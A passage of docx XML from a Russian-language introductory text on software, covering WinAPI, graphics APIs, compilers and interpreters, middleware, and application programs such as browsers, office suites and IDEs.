        <w:t>int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,</w:t>
        <w:br/>
        <w:t xml:space="preserve">                   LPSTR lpCmdLine, int nCmdShow) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    MessageBox(NULL, "Hello, Windows!", "My App", MB_OK);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return 0;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Появляется окошко с кнопкой "OK". WinAPI делает всю грязную работу: рисует окно, обрабатывает клики, управляет памятью.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 3: DirectX vs OpenGL</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DirectX (Windows):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>API для игр: графика (Direct3D), звук (DirectSound), ввод (DirectInput).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Закрытый, работает только на Windows.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Используется в AAA-играх (Call of Duty, Battlefield).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>OpenGL (кросс-платформенный):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>API для 3D-графики, работает на Windows, Linux, macOS, Android.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Открытый стандарт.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Используется в Minecraft (до версии 1.17), CS:GO, многих инди-играх.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vulkan (современный):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Низкоуровневый API, замена OpenGL.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Даёт программисту больше контроля → выше производительность.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Используется в Doom Eternal, Cyberpunk 2077, Dota 2, Red Dead Redemption 2.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сравнение производительности:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| API       | FPS в игре X (условный тест) | Сложность программирования |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-----------|------------------------------|----------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| DirectX 11| 60 FPS                       | Средняя                    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| DirectX 12| 80 FPS                       | Высокая                    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| OpenGL    | 55 FPS                       | Средняя                    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Vulkan    | 90 FPS                       | Очень высокая              |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Vulkan быстрее, но сложнее. DirectX 12 — компромисс. OpenGL устарел. Прогресс не стоит на месте.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Компиляторы и интерпретаторы: от кода к программе</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Компилятор</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — переводит код на языке программирования в машинный код (исполняемый файл).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Интерпретатор</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — выполняет код построчно, без создания исполняемого файла.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Компиляция (GCC, Clang, rustc):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Компиляция программы на C</w:t>
        <w:br/>
        <w:t>gcc main.c -o program</w:t>
        <w:br/>
        <w:t>./program</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Быстрое выполнение (код уже переведён в машинные инструкции).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оптимизация (компилятор может ускорить код).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Долгая компиляция (для больших проектов — десятки минут).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нужна перекомпиляция для каждой платформы (Linux → Windows = разные исполняемые файлы).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Интерпретация (Python, JavaScript):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Запуск программы на Python</w:t>
        <w:br/>
        <w:t>python script.py</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не нужна компиляция — написал код, сразу запустил.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кросс-платформенность (один и тот же скрипт работает везде).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Медленнее компилируемых языков (в 10-100 раз).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нужен интерпретатор на целевой машине.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>JIT-компиляция (Just-In-Time): гибрид</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Java (JVM), JavaScript (V8 в Chrome), C# (.NET).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Код компилируется в **байт-код** (промежуточное представление).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>При запуске JIT-компилятор переводит байт-код в машинный код **на лету**, прямо во время выполнения.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Часто используемые участки кода компилируются с оптимизацией (hotspot optimization).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кросс-платформенность (байт-код запускается на любой JVM).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Скорость близка к компилируемым языкам (после прогрева JIT).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Жрёт память (JVM может занимать гигабайты).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Первый запуск медленнее (JIT греется).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Java-программа запускается медленно первые 10 секунд (JIT компилирует код), потом работает быстро.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Middleware: клей для микросервисов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Middleware</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это программы, которые связывают разные части системы. Особенно важны в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>микросервисной архитектуре</w:t>
      </w:r>
      <w:r>
        <w:t>, где приложение разбито на десятки маленьких сервисов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. Веб-серверы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**nginx** — лёгкий, быстрый, популярный (30% сайтов).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Apache HTTP Server** — старый, надёжный, гибкий (20% сайтов).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**IIS (Internet Information Services)** — веб-сервер Windows.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. Серверы приложений:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Apache Tomcat** — для Java-приложений (JSP, Servlets).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Node.js** — JavaScript на сервере (асинхронный, быстрый).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3. Брокеры сообщений:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**RabbitMQ** — очереди сообщений между сервисами.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Apache Kafka** — стриминг данных (используется в Twitter, LinkedIn, Netflix).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Заказал еду в приложении доставки.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Фронтенд (React) отправляет запрос на API-шлюз (nginx).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>API-шлюз перенаправляет на сервис заказов (Java + Spring Boot на Tomcat).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сервис заказов кладёт сообщение в очередь RabbitMQ: "Новый заказ".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сервис уведомлений (Python) читает очередь, отправляет push-уведомление курьеру.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Курьер видит заказ в своём приложении.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Middleware связывает компоненты. Без него микросервисы не могут общаться.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.2.4. Прикладное ПО: программы для людей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Прикладное ПО — это финальный продукт. То, что видит пользователь.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>ПО общего назначения: для всех</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Офисные пакеты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Microsoft Office</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (платный, ~$100/год):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Word** — текстовый редактор.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Excel** — табличный процессор (формулы, графики, макросы).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**PowerPoint** — презентации.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Outlook** — почта, календарь.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>LibreOffice</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (бесплатный, open-source):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Альтернатива MS Office.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Совместим с форматами `.docx`, `.xlsx`, `.pptx`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Минус: иногда криво отображает сложные документы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Google Docs / Sheets / Slides</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (бесплатный, облачный):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Работает в браузере.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Автосохранение, совместная работа в реальном времени.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Минус: нужен интернет (хотя есть офлайн-режим).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Браузеры: окно в интернет</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Chrome</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Google):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Самый популярный (65% рынка, 2025).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Быстрый, расширяемый (тысячи плагинов).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Минус:** Жрёт RAM как зверь. Открыл 20 вкладок → 8 GB памяти улетело.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Firefox</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Mozilla):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Уважение за приватность (меньше слежки, чем у Chrome).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Open-source.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Минус:** Доля рынка падает (~3%). Некоторые сайты оптимизированы под Chrome.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Safari</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Apple):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Встроенный в macOS / iOS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оптимизирован под Apple Silicon (энергоэффективность).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Минус:** Только для устройств Apple. Веб-разработчики его ненавидят (медленно внедряет новые стандарты).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Edge</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Microsoft):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Построен на движке Chromium (как Chrome).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Интеграция с Windows 11.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Неожиданно неплохой.** В 2020 все смеялись, в 2025 — ~5% рынка.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему Chrome жрёт RAM?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Каждая вкладка — отдельный процесс (изоляция для безопасности).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если одна вкладка крашнется — другие выживут.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Цена: 100-300 MB на вкладку.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Открыл 50 вкладок → 15 GB RAM. Компьютер тормозит. Страдания.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Медиаплееры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>VLC Media Player:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Воспроизводит **всё** (даже полуразбитые файлы, недокачанные торренты).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Бесплатный, open-source.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Легенда. Иконка с дорожным конусом — символ надёжности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Spotify / Apple Music / YouTube Music:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Стриминг музыки (десятки миллионов треков за $10/месяц).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Минус: музыка не твоя (подписка закончилась → музыка пропала).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Специализированное ПО: для профессионалов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>IDE для разработчиков</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Visual Studio Code (VS Code):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Лёгкий, быстрый, бесплатный.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поддержка всех языков (через расширения).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Самая популярная IDE (2025). Даже те, кто ненавидел Microsoft, признали: VS Code — огонь.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>JetBrains (PyCharm, IntelliJ IDEA, WebStorm):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Мощные, с умными подсказками (IntelliSense на стероидах).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Платные (~$200/год), но есть бесплатные версии (Community Edition).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Медленнее VS Code, но функциональнее.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Visual Studio (полная версия):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Монстр от Microsoft для C++, C#, .NET.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Весит 10-40 GB (с компонентами).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Используется в крупных корпорациях (игры, банки).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Графика и дизайн</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Adobe Creative Suite</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (платный, ~$60/месяц):</w:t>
      </w:r>
    </w:p>
    <w:p>
